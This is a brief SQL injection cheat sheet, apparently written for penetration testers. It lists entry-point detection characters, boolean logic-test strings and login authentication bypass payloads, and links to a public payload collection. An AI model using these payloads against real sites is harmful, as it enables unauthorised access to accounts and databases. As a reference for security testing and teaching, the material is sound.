# Sql Injection

## Overview

SQL Injection58 is a common web vulnerability found in dynamic sites that is caused by unsanitized user input, which is then passed on to a database.  This user input can then be manipulated to “break out” of the original query made by the developers, to include more malicious actions.

## Discovery/Entry point Detection

Good payload to for discovery is :

    '
    "
    ;
    )
    *
    --

Logic Testing

    1 or 1=1 --  filler
    1' or 1=1 -- '
    1" or 1=1 -- '
    1 and 1=2 -- false

## Auth Bypass Payloads

    admin' or '1'='1
    admin')-- -
    admin') OR 1=1 -- '


## More Information

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection